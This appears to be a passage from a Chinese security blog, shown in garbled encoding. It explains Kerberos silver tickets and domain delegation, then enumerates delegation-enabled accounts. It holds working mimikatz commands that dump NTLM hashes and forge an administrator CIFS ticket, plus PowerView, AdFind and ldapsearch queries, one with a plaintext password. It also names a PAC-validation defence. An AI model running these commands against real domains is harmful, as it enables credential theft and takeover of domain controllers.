<h3 id="2-ç™½é“¶ç¥¨æ®"><a href="#2-ç™½é“¶ç¥¨æ®" class="headerlink" title="2.ç™½é“¶ç¥¨æ®"></a>2.ç™½é“¶ç¥¨æ®</h3><p>åœ¨TGS-REPé˜¶æ®µï¼ŒTGS_REPé‡Œé¢çš„ticketçš„enc-partæ˜¯ä½¿ç”¨æœåŠ¡çš„hashè¿›è¡ŒåŠ å¯†çš„ï¼Œå¦‚æœæˆ‘ä»¬æ‹¥æœ‰æœåŠ¡çš„hashï¼Œå°±å¯ä»¥ç»™æˆ‘ä»¬è‡ªå·±ç­¾å‘ä»»æ„ç”¨æˆ·çš„TGSç¥¨æ®ï¼Œè¿™ä¸ªç¥¨æ®ä¹Ÿè¢«ç§°ä¸ºç™½é“¶ç¥¨æ®ã€‚ç›¸è¾ƒäºé»„é‡‘ç¥¨æ®ï¼Œç™½é“¶ç¥¨æ®ä½¿ç”¨è¦è®¿é—®æœåŠ¡çš„hashï¼Œè€Œä¸æ˜¯krbtgtçš„hashï¼Œç”±äºç”Ÿæˆçš„æ˜¯TGSç¥¨æ®ï¼Œä¸éœ€è¦è·ŸåŸŸæ§æ‰“äº¤é“ï¼Œä½†æ˜¯ç™½é“¶ç¥¨ç¥¨æ®åªèƒ½è®¿é—®ç‰¹å®šæœåŠ¡ã€‚ä½†æ˜¯è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œä¼ªé€ çš„ç™½é“¶ç¥¨æ®æ²¡æœ‰å¸¦æœ‰æœ‰æ•ˆKDCç­¾åçš„PACã€‚å¦‚æœå°†ç›®æ ‡ä¸»æœºé…ç½®ä¸ºéªŒè¯KDC PACç­¾åï¼Œåˆ™é“¶ç¥¨å°†ä¸èµ·ä½œç”¨</p>
<p>è¦åˆ›å»ºç™½é“¶ç¥¨æ®ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ä»¥ä¸‹ä¿¡æ¯ï¼š</p>
<ul>
<li><p>è¦ä¼ªé€ çš„åŸŸç”¨æˆ·(è¿™é‡Œæˆ‘ä»¬ä¸€èˆ¬å¡«å†™åŸŸç®¡ç†å‘˜è´¦æˆ·)</p>
</li>
<li><p>åŸŸå</p>
</li>
<li><p>åŸŸçš„SIDå€¼(å°±æ˜¯åŸŸæˆå‘˜SIDå€¼å»æ‰æœ€åçš„)</p>
</li>
<li><p>ç›®æ ‡æœåŠ¡çš„FQDN</p>
</li>
<li><p>å¯åˆ©ç”¨çš„æœåŠ¡</p>
</li>
<li><p>æœåŠ¡è´¦å·çš„NTLMå“ˆå¸Œ</p>
</li>
</ul>
<p>è¿™é‡Œä½¿ç”¨ç™½é“¶ç¥¨æ®ä¼ªé€ CIFSæœåŠ¡ï¼Œè¯¥é€šå¸¸ç”¨äºWindowsä¸»æœºä¹‹é—´çš„æ–‡ä»¶å…±äº«ã€‚</p>
<p>1.mimikatzè·å¾—æœåŠ¡è´¦å·çš„ntlm hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::Debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>



<p><img src="https://i.bmp.ovh/imgs/2021/10/a1a95b5f33580de8.png"></p>
<p>å¾—åˆ°NTLMä¸º: 2c268a2a643267a4204a6ef6f896446b</p>
<p>2.ä½¿ç”¨ç™½é“¶ç¥¨æ®æ”»å‡»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:2c268a2a643267a4204a6ef6f896446b /user:administrator /ptt</span><br></pre></td></tr></table></figure>



<p><img src="https://i.bmp.ovh/imgs/2021/10/97010fec5746ed11.png"></p>
<p>3.æŸ¥çœ‹ç¥¨æ®</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/993e4ffe96082804.png"></p>
<p>4.è®¿é—®åŸŸæ§</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/310e4fec54b90552.png"></p>
<p>é˜²å¾¡ï¼š</p>
<p>ä¼ªé€ çš„ç™½é“¶ç¥¨æ®æ²¡æœ‰å¸¦æœ‰æœ‰æ•ˆKDCç­¾åçš„PACã€‚å¦‚æœå°†ç›®æ ‡ä¸»æœºé…ç½®ä¸ºéªŒè¯KDC PACç­¾åï¼Œåˆ™é“¶ç¥¨å°†ä¸èµ·ä½œç”¨ã€‚</p>
<h3 id="3-ç™½é“¶ç¥¨æ®å’Œé»„é‡‘ç¥¨æ®çš„ä¸åŒç‚¹"><a href="#3-ç™½é“¶ç¥¨æ®å’Œé»„é‡‘ç¥¨æ®çš„ä¸åŒç‚¹" class="headerlink" title="3.ç™½é“¶ç¥¨æ®å’Œé»„é‡‘ç¥¨æ®çš„ä¸åŒç‚¹"></a>3.ç™½é“¶ç¥¨æ®å’Œé»„é‡‘ç¥¨æ®çš„ä¸åŒç‚¹</h3><p>è®¿é—®æƒé™ä¸åŒï¼š</p>
<p>é»„é‡‘ç¥¨æ®Golden Ticketï¼šä¼ªé€ TGTè®¤è´­æƒè¯ï¼Œå¯ä»¥è·å–ä»»ä½•KerberosæœåŠ¡æƒé™</p>
<p>ç™½é“¶ç¥¨æ®Silver Ticketï¼šä¼ªé€ STæœåŠ¡ç¥¨æ®ï¼Œåªèƒ½è®¿é—®æŒ‡å®šçš„æœåŠ¡</p>
<p>åŠ å¯†æ–¹å¼ä¸åŒï¼š</p>
<p>Golden Ticketç”±krbtgtçš„HashåŠ å¯†</p>
<p>Silver Ticket ç”±æœåŠ¡è´¦å·ï¼ˆé€šå¸¸ä¸ºè®¡ç®—æœºè´¦æˆ·ï¼‰HashåŠ å¯†</p>
<p>è®¤è¯æµç¨‹ä¸åŒï¼š</p>
<p>Golden Ticketçš„åˆ©ç”¨è¿‡ç¨‹éœ€è¦è®¿é—®åŸŸæ§ï¼Œ</p>
<p>è€ŒSilver Ticketä¸éœ€è¦</p>
<h1 id="å§”æ´¾"><a href="#å§”æ´¾" class="headerlink" title="å§”æ´¾"></a>å§”æ´¾</h1><p>åŸŸå§”æ´¾æ˜¯æŒ‡ï¼Œå°†åŸŸå†…ç”¨æˆ·çš„æƒé™å§”æ´¾ç»™æœåŠ¡è´¦å·ï¼Œä½¿å¾—æœåŠ¡è´¦å·èƒ½ä»¥ç”¨æˆ·æƒé™å¼€å±•åŸŸå†…æ´»åŠ¨ã€‚</p>
<p>æœåŠ¡è´¦å·ï¼ˆService Accountï¼‰ï¼ŒåŸŸå†…ç”¨æˆ·çš„ä¸€ç§ç±»å‹ï¼ŒæœåŠ¡å™¨è¿è¡ŒæœåŠ¡æ—¶æ‰€ç”¨çš„è´¦å·ï¼Œå°†æœåŠ¡è¿è¡Œèµ·æ¥å¹¶åŠ å…¥åŸŸã€‚ä¾‹å¦‚MS SQL Serveråœ¨å®‰è£…æ—¶ï¼Œä¼šåœ¨åŸŸå†…è‡ªåŠ¨æ³¨å†ŒæœåŠ¡è´¦å·SqlServiceAccountï¼Œè¿™ç±»è´¦å·ä¸èƒ½ç”¨äºäº¤äº’å¼ç™»å½•ã€‚</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/7d6d7f0ccec809a7.png"></p>
<p>ä¸Šå›¾æ˜¯ç»å…¸çš„åº”ç”¨åœºæ™¯ã€‚ä¸€ä¸ªåŸŸå†…æ™®é€šç”¨æˆ·jacké€šè¿‡Kerberosåè®®è®¤è¯åˆ°å‰å°WEBæœåï¼Œå‰å°è¿è¡ŒWEBæœåŠ¡çš„æœåŠ¡è´¦å·websvcæ¨¡æ‹Ÿï¼ˆImpersonateï¼‰ç”¨æˆ·jackï¼Œä»¥Kerberosåè®®ç»§ç»­è®¤è¯åˆ°åå°æœåŠ¡å™¨ï¼Œä»è€Œåœ¨åå°æœåŠ¡å™¨ä¸­è·å–jackç”¨æˆ·çš„è®¿é—®æƒé™ï¼Œå³åŸŸä¸­è·³æˆ–è€…å¤šè·³çš„Kerberosè®¤è¯ã€‚æŒ‰ç…§å›¾ä¸­çº¢è‰²å­—ä½“çš„æ•°å­—ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ul>
<li><p>åŸŸå†…ç”¨æˆ·jackä»¥Kerberosæ–¹å¼è®¤è¯åè®¿é—®WebæœåŠ¡å™¨ï¼›</p>
</li>
<li><p>WebæœåŠ¡ä»¥websvcæœåŠ¡è´¦å·è¿è¡Œï¼Œwebsvcå‘KDCå‘èµ·jackç”¨æˆ·çš„ç¥¨æ®ç”³è¯·ï¼›</p>
</li>
<li><p>KDCæ£€æŸ¥websvcç”¨æˆ·çš„å§”æ´¾å±æ€§ï¼Œå¦‚æœè¢«è®¾ç½®ï¼Œåˆ™è¿”å›jackç”¨æˆ·çš„å¯è½¬å‘ç¥¨æ®TGTï¼›</p>
</li>
<li><p>websvcæ”¶åˆ°jackç”¨æˆ·TGTåï¼Œä½¿ç”¨è¯¥ç¥¨æ®å‘KDCç”³è¯·è®¿é—®æ–‡ä»¶æœåŠ¡å™¨çš„æœåŠ¡ç¥¨æ®TGSï¼›</p>
</li>
<li><p>KDCæ£€æŸ¥websvcçš„å§”æ´¾å±æ€§ï¼Œå¦‚æœè¢«è®¾ç½®ï¼Œä¸”ç”³è¯·çš„æ–‡ä»¶æœåŠ¡åœ¨å…è®¸çš„åˆ—è¡¨æ¸…å•ä¸­ï¼Œåˆ™è¿”å›ä¸€ä¸ªjackç”¨æˆ·è®¿é—®æ–‡ä»¶æœåŠ¡çš„æˆæƒç¥¨æ®TGSï¼›</p>
</li>
<li><p>websvcæ”¶åˆ°çš„jackç”¨æˆ·çš„æˆæƒç¥¨æ®TGSåï¼Œå¯è®¿é—®æ–‡ä»¶æœåŠ¡ï¼Œå®Œæˆå¤šè·³è®¤è¯ã€‚</p>
</li>
</ul>
<p><strong>åœ¨åŸŸä¸­ï¼Œåªæœ‰ æœåŠ¡è´¦å· å’Œ ä¸»æœºè´¦å· æ‰å…·æœ‰å§”æ´¾å±æ€§</strong></p>
<p>ä¸»æœºè´¦å·å°±æ˜¯ADæ´»åŠ¨ç›®å½•ä¸­ Computers ä¸­çš„è®¡ç®—æœºï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºæœºå™¨è´¦å·(ä¸€ä¸ªæ™®é€šåŸŸç”¨æˆ·é»˜è®¤æœ€å¤šå¯ä»¥åˆ›å»ºåä¸ªä¸»æœºè´¦å·)ã€‚</p>
<p>æœåŠ¡è´¦å·ï¼ˆService Accountï¼‰æ˜¯åŸŸå†…ç”¨æˆ·çš„ä¸€ç§ç±»å‹ï¼Œæ˜¯æœåŠ¡å™¨è¿è¡ŒæœåŠ¡æ—¶æ‰€ç”¨çš„è´¦å·ï¼Œå°†æœåŠ¡è¿è¡Œèµ·æ¥å¹¶åŠ å…¥åŸŸã€‚ä¾‹å¦‚SQL Server åœ¨å®‰è£…æ—¶ï¼Œä¼šåœ¨åŸŸå†…è‡ªåŠ¨æ³¨å†ŒæœåŠ¡è´¦å· SQLServiceAccountã€‚ä¹Ÿå¯ä»¥å°†åŸŸç”¨æˆ·é€šè¿‡æ³¨å†ŒSPNå˜ä¸ºæœåŠ¡è´¦å·ã€‚</p>
<p><strong>å§”æ´¾çš„å‰æ</strong></p>
<p>éœ€è¦è¢«å§”æ´¾çš„ç”¨æˆ·æœªè®¾ç½®ä¸å…è®¸è¢«å§”æ´¾å±æ€§ã€‚</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/35d2a3847a9d3a1b.png"></p>
<p>å¦‚æœå‹¾ä¸Šåˆ™administratorè´¦æˆ·ä¸èƒ½è¢«å§”æ´¾</p>
<h2 id="éçº¦æŸæ€§å§”æ´¾"><a href="#éçº¦æŸæ€§å§”æ´¾" class="headerlink" title="éçº¦æŸæ€§å§”æ´¾"></a>éçº¦æŸæ€§å§”æ´¾</h2><p>å¯¹äºéçº¦æŸæ€§å§”æ´¾ï¼ŒæœåŠ¡è´¦å·å¯ä»¥è·å–è¢«å§”æ´¾ç”¨æˆ·çš„<code>TGT</code>ï¼Œå¹¶å°†<code>TGT</code>ç¼“å­˜åˆ°<code>LSASS</code>è¿›ç¨‹ä¸­ï¼Œä»è€ŒæœåŠ¡è´¦å·å¯ä½¿ç”¨è¯¥<code>TGT</code>ï¼Œæ¨¡æ‹Ÿç”¨æˆ·è®¿é—®ä»»æ„æœåŠ¡ã€‚</p>
<p>å½“æœåŠ¡è´¦å·æˆ–è€…ä¸»æœºè¢«è®¾ç½®ä¸ºéçº¦æŸæ€§å§”æ´¾æ—¶ï¼Œå…¶<code>userAccountControl</code>å±æ€§ä¼šåŒ…å«<code>WORKSTATION_TRUSTED_FOR_DELEGATION</code></p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/0e511d64e31f04c8.png"></p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/4413b783afa45451.png"></p>
<p>ä»ç½‘ç»œæ”»å‡»çš„è§’åº¦çœ‹ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶äº†æœåŠ¡è´¦å·Bï¼Œå¹¶è¯±éª—ç®¡ç†å‘˜æ¥è®¿é—®æœåŠ¡Aï¼Œåˆ™å¯ä»¥è·å–ç®¡ç†å‘˜çš„TGTï¼Œè¿›è€Œæ¨¡æ‹Ÿç®¡ç†å‘˜è®¿é—®ä»»æ„æœåŠ¡ï¼Œå³è·å¾—ç®¡ç†å‘˜æƒé™ã€‚è¶Šæ˜¯å¤§å‹ç½‘ç»œã€åº”ç”¨è¶Šå¤šçš„ç½‘ç»œï¼ŒæœåŠ¡è´¦å·è¶Šå¤šï¼Œå§”æ´¾çš„åº”ç”¨è¶Šå¤šï¼Œè¶Šå®¹æ˜“è·å–åŸŸç®¡ç†å‘˜æƒé™ã€‚</p>
<h2 id="çº¦æŸæ€§å§”æ´¾"><a href="#çº¦æŸæ€§å§”æ´¾" class="headerlink" title="çº¦æŸæ€§å§”æ´¾"></a>çº¦æŸæ€§å§”æ´¾</h2><p>ç”±äºéçº¦æŸå§”æ´¾çš„ä¸å®‰å…¨æ€§ï¼Œå¾®è½¯åœ¨Windows Server 2003ä¸­å‘å¸ƒäº†çº¦æŸæ€§å§”æ´¾ã€‚å¯¹äºçº¦æŸæ€§å§”æ´¾ï¼ˆConstrained Delegationï¼‰ï¼Œå³Kerberosçš„ä¸¤ä¸ªæ‰©å±•å­åè®® S4u2self (Service for User to Self) å’Œ S4u2Proxy (Service for User to Proxy )ï¼ŒæœåŠ¡è´¦å·åªèƒ½è·å–ç”¨æˆ·çš„TGSï¼Œä»è€Œåªèƒ½æ¨¡æ‹Ÿç”¨æˆ·è®¿é—®ç‰¹å®šçš„æœåŠ¡ã€‚</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/a55c68177381b8c7.png"></p>
<p>é…ç½®äº†çº¦æŸå§”æ´¾çš„è´¦æˆ·çš„ userAccountControl å±æ€§æœ‰ä¸ªFLAGä½ TRUSTED_TO_AUTH_FOR_DELEGATIONï¼Œå¹¶ä¸”msDS-AllowedToDelegateTo å±æ€§è¿˜ä¼šæŒ‡å®šå¯¹å“ªä¸ªSPNè¿›è¡Œå§”æ´¾ã€‚</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/67f4c164404b41aa.png"></p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/d8f73ef834fe109e.png"></p>
<h2 id="åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾"><a href="#åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾" class="headerlink" title="åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾"></a><strong>åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾</strong></h2><p>ä¸ºäº†ä½¿ç”¨æˆ·/èµ„æºæ›´åŠ ç‹¬ç«‹ï¼Œå¾®è½¯åœ¨Windows Server 2012ä¸­å¼•å…¥äº†åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ã€‚åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ä¸éœ€è¦åŸŸç®¡ç†å‘˜æƒé™å»è®¾ç½®ï¼Œè€ŒæŠŠè®¾ç½®å±æ€§çš„æƒé™èµ‹äºˆç»™äº†æœºå™¨è‡ªèº«ã€‚åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾å…è®¸èµ„æºé…ç½®å—ä¿¡ä»»çš„å¸æˆ·å§”æ´¾ç»™ä»–ä»¬ã€‚åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾åªèƒ½åœ¨è¿è¡ŒWindows Server 2012å’ŒWindows Server 2012 R2åŠä»¥ä¸Šçš„åŸŸæ§åˆ¶å™¨ä¸Šé…ç½®ï¼Œä½†å¯ä»¥åœ¨æ··åˆæ¨¡å¼æ—ä¸­åº”ç”¨ã€‚é…ç½®äº†åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾çš„è´¦æˆ·çš„ userAccountControl å±æ€§ä¸º WORKSTATION_TRUST_ACCOUNTï¼Œå¹¶ä¸”msDS-AllowedToActOnBehalfOfOtherIdentity å±æ€§çš„å€¼ä¸ºè¢«å…è®¸åŸºäºèµ„æºçº¦æŸæ€§å§”æ´¾çš„è´¦å·çš„SIDã€‚  </p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/9a8f66d5b35815e1.png"></p>
<h2 id="åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾å’Œçº¦æŸæ€§å§”æ´¾å·®åˆ«"><a href="#åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾å’Œçº¦æŸæ€§å§”æ´¾å·®åˆ«" class="headerlink" title="åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾å’Œçº¦æŸæ€§å§”æ´¾å·®åˆ«"></a>åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾å’Œçº¦æŸæ€§å§”æ´¾å·®åˆ«</h2><p>å§”æ´¾çš„æƒé™æˆäºˆç»™äº†æ‹¥æœ‰èµ„æºçš„åç«¯(B)ï¼Œè€Œä¸å†æ˜¯å‰ç«¯(A)</p>
<p>çº¦æŸæ€§å§”æ´¾ä¸èƒ½è·¨åŸŸè¿›è¡Œå§”æ´¾ï¼ŒåŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾å¯ä»¥è·¨åŸŸå’Œæ—</p>
<p>ä¸å†éœ€è¦åŸŸç®¡ç†å‘˜æƒé™è®¾ç½®å§”æ´¾ï¼Œåªéœ€æ‹¥æœ‰åœ¨è®¡ç®—æœºå¯¹è±¡ä¸Šç¼–è¾‘â€msDS-AllowedToActOnBehalfOfOtherIdentityâ€å±æ€§çš„æƒé™ï¼Œä¹Ÿå°±æ˜¯ å°†è®¡ç®—æœºåŠ å…¥åŸŸçš„åŸŸç”¨æˆ· å’Œ æœºå™¨è‡ªèº« æ‹¥æœ‰æƒé™ã€‚</p>
<p>ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾æ˜¯â€œæ­£å‘çš„â€ï¼Œé€šè¿‡ä¿®æ”¹æœåŠ¡Açš„å±æ€§â€msDS-AllowedToDelegateToâ€ï¼Œæ·»åŠ æœåŠ¡Bçš„SPNï¼ˆService Principle Nameï¼‰ï¼Œè®¾ç½®çº¦æŸå§”æ´¾å¯¹è±¡ï¼ˆæœåŠ¡Bï¼‰ï¼ŒæœåŠ¡Aä¾¿å¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·å‘åŸŸæ§åˆ¶å™¨è¯·æ±‚è®¿é—®æœåŠ¡Bçš„STæœåŠ¡ç¥¨æ®ã€‚</p>
<p>è€ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾åˆ™æ˜¯ç›¸åçš„ï¼Œé€šè¿‡ä¿®æ”¹æœåŠ¡Bå±æ€§â€msDS-AllowedToActOnBehalfOfOtherIdentityâ€ï¼Œæ·»åŠ æœåŠ¡Açš„SIDï¼Œè¾¾åˆ°è®©æœåŠ¡Aæ¨¡æ‹Ÿç”¨æˆ·è®¿é—®Bèµ„æºçš„ç›®çš„ã€‚</p>
<h2 id="éçº¦æŸå§”æ´¾å’Œçº¦æŸå§”æ´¾çš„æµç¨‹"><a href="#éçº¦æŸå§”æ´¾å’Œçº¦æŸå§”æ´¾çš„æµç¨‹" class="headerlink" title="éçº¦æŸå§”æ´¾å’Œçº¦æŸå§”æ´¾çš„æµç¨‹"></a>éçº¦æŸå§”æ´¾å’Œçº¦æŸå§”æ´¾çš„æµç¨‹</h2><h3 id="1-éçº¦æŸå§”æ´¾æµç¨‹"><a href="#1-éçº¦æŸå§”æ´¾æµç¨‹" class="headerlink" title="1.éçº¦æŸå§”æ´¾æµç¨‹"></a>1.éçº¦æŸå§”æ´¾æµç¨‹</h3><p><strong>å‰æï¼š</strong>åœ¨æœºå™¨è´¦å·Bä¸Šé…ç½®äº†éçº¦æŸæ€§å§”æ´¾(åŸŸç®¡ç†å‘˜æ‰æœ‰æƒé™é…ç½®)</p>
<p>1.ç”¨æˆ·è®¿é—®æœºå™¨Bçš„æŸä¸ªæœåŠ¡ï¼Œäºæ˜¯å‘KDCè®¤è¯ã€‚KDCä¼šæ£€æŸ¥æœºå™¨Bçš„æœºå™¨è´¦å·çš„å±æ€§ï¼Œå‘ç°æ˜¯éçº¦æŸæ€§å§”æ´¾ï¼ŒKDCä¼šå°†ç”¨æˆ·çš„TGTæ”¾åœ¨STæœåŠ¡ç¥¨æ®ä¸­ã€‚</p>
<p>2.ç”¨æˆ·è®¿é—®æœºå™¨Bæ—¶ï¼ŒTGTç¥¨æ®ä¼šå’ŒSTæœåŠ¡ç¥¨æ®ä¸€åŒå‘é€ç»™æœºå™¨B</p>
<p>3.è¿™æ ·Båœ¨éªŒè¯STæœåŠ¡ç¥¨æ®çš„åŒæ—¶è·å–äº†ç”¨æˆ·çš„TGTï¼Œå¹¶å°†TGTå­˜å‚¨åœ¨LSASSè¿›ç¨‹ä¸­ï¼Œä»è€Œå¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·è®¿é—®ä»»æ„æœåŠ¡</p>
<p>ä»ç½‘ç»œæ”»å‡»çš„è§’åº¦æ¥çœ‹ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶äº†æœºå™¨Bçš„æœºå™¨è´¦å·ï¼Œå¹¶ä¸”æœºå™¨Bé…ç½®äº†éçº¦æŸæ€§å§”æ´¾ã€‚åˆ™æ”»å‡»è€…å¯ä»¥è¯±éª—ç®¡ç†å‘˜æ¥è®¿é—®æœºå™¨Bï¼Œç„¶åæ”»å‡»è€…å¯ä»¥è·å–ç®¡ç†å‘˜çš„TGTï¼Œä»è€Œæ¨¡æ‹Ÿç®¡ç†å‘˜è®¿é—®ä»»æ„æœåŠ¡ï¼Œå³è·å¾—äº†ç®¡ç†å‘˜æƒé™ã€‚</p>
<h3 id="2-çº¦æŸæ€§å§”æ´¾æµç¨‹"><a href="#2-çº¦æŸæ€§å§”æ´¾æµç¨‹" class="headerlink" title="2.çº¦æŸæ€§å§”æ´¾æµç¨‹"></a>2.çº¦æŸæ€§å§”æ´¾æµç¨‹</h3><p><strong>å‰æï¼š</strong>åœ¨æœåŠ¡Aä¸Šé…ç½®åˆ°æœåŠ¡Bçº¦æŸæ€§å§”æ´¾(åŸŸç®¡ç†å‘˜æ‰æœ‰æƒé™é…ç½®)</p>
<p>1.ç”¨æˆ·è®¿é—®æœåŠ¡Aï¼Œäºæ˜¯å‘åŸŸæ§è¿›è¡Œkerberosè®¤è¯ï¼ŒåŸŸæ§è¿”å›ST1æœåŠ¡ç¥¨æ®ç»™ç”¨æˆ·ï¼Œç”¨æˆ·ä½¿ç”¨æ­¤æœåŠ¡ç¥¨æ®è®¿é—®æœåŠ¡A</p>
<p>2.è‹¥è¯¥æœåŠ¡Aå…è®¸å§”æ´¾ç»™æœåŠ¡Bï¼Œåˆ™Aèƒ½ä½¿ç”¨S4U2Proxyåè®®å°†ç”¨æˆ·å‘é€ç»™è‡ªå·±çš„å¯è½¬å‘çš„ST1æœåŠ¡ç¥¨æ®ä»¥ç”¨æˆ·çš„èº«ä»½å†è½¬å‘ç»™åŸŸæ§åˆ¶å™¨ã€‚äºæ˜¯åŸŸæ§è¿”å›ç»™æœåŠ¡Aä¸€ä¸ªST2æœåŠ¡ç¥¨æ®ï¼Œ</p>
<p>3.æœåŠ¡Aä¾¿èƒ½ä½¿ç”¨è·å¾—çš„ST2æœåŠ¡ç¥¨æ®ä»¥ç”¨æˆ·çš„èº«ä»½è®¿é—®æœåŠ¡Bã€‚</p>
<p>ä»ç½‘ç»œæ”»å‡»çš„è§’åº¦æ¥çœ‹ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶äº†æœåŠ¡Açš„è´¦å·ï¼Œå¹¶ä¸”æœåŠ¡Aé…ç½®äº†åˆ°åŸŸæ§çš„CIFSæœåŠ¡çš„çº¦æŸæ€§å§”æ´¾ã€‚åˆ™æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æœåŠ¡Aä»¥administratorèº«ä»½è®¿é—®åŸŸæ§çš„CIFSæœåŠ¡ï¼Œå³ç›¸å½“äºæ§åˆ¶äº†åŸŸæ§ã€‚</p>
<h2 id="ç­›é€‰éå§”æ´¾å±æ€§çš„è´¦å·"><a href="#ç­›é€‰éå§”æ´¾å±æ€§çš„è´¦å·" class="headerlink" title="ç­›é€‰éå§”æ´¾å±æ€§çš„è´¦å·"></a>ç­›é€‰éå§”æ´¾å±æ€§çš„è´¦å·</h2><p>æ³¨ï¼šåŸŸæ§ä¸»æœºè´¦æˆ·é»˜è®¤å¼€å¯éçº¦æŸå§”æ´¾</p>
<h3 id="1-PowerSploitä¸‹çš„PowerView-ps1è„šæœ¬"><a href="#1-PowerSploitä¸‹çš„PowerView-ps1è„šæœ¬" class="headerlink" title="1.PowerSploitä¸‹çš„PowerView.ps1è„šæœ¬"></a>1.PowerSploitä¸‹çš„PowerView.ps1è„šæœ¬</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1;</span><br><span class="line"> </span><br><span class="line">æŸ¥è¯¢åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„è´¦æˆ·</span><br><span class="line">Get-NetUser -Unconstrained -Domain 0day.org</span><br><span class="line">Get-NetUser -Unconstrained -Domain 0day.org | select name</span><br><span class="line">æŸ¥è¯¢åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ä¸»æœºï¼š</span><br><span class="line">Get-NetComputer -Unconstrained -Domain 0day.org | select name</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/c5fb59818b3b79d2.png"></p>
<h3 id="2-ADFind"><a href="#2-ADFind" class="headerlink" title="2.ADFind"></a>2.ADFind</h3><p>ä½¿ç”¨å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind [switches] [-b basedn] [-f filter] [attr list]</span><br></pre></td></tr></table></figure>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><p>-bï¼šæŒ‡å®šè¦æŸ¥è¯¢çš„æ ¹èŠ‚ç‚¹</p>
</li>
<li><p>-fï¼šLDAPè¿‡æ»¤æ¡ä»¶</p>
</li>
<li><p>attr listï¼šéœ€è¦æ˜¾ç¤ºçš„å±æ€§</p>
</li>
</ul>
<p>æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ç”¨æˆ·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>



<p>æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ä¸»æœºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>



<p><img src="https://i.bmp.ovh/imgs/2021/10/141e052e8a6ea73e.png"></p>
<h3 id="3-ldapsearch"><a href="#3-ldapsearch" class="headerlink" title="3.ldapsearch"></a>3.ldapsearch</h3><p>kaliè‡ªå¸¦ï¼Œå¯ä»¥åœ¨åŸŸå¤–ä½¿ç”¨</p>
<p>æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ç”¨æˆ·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.200.143:389 -D &quot;CN=administrator,CN=Users,DC=0day,DC=org&quot; -w admin\!\@\#45 -b &quot;DC=0day,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>



<p>æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ä¸»æœºï¼š</p>
